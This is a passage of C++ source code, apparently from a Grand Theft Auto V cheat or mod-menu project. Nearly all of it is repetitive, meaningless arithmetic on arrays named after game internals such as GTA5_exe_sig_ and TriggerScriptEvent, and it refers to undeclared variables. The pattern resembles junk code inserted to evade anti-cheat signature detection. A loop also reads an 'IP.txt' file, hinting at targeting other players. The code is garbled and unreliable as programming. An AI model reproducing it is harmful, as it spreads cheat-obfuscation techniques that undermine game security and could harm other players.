					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				std::vector<string> TempVECTOR;
				vector<string> tokens;
				ifstream imput("IP.txt");
				for (string line; getline(imput, line);)
				{
					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
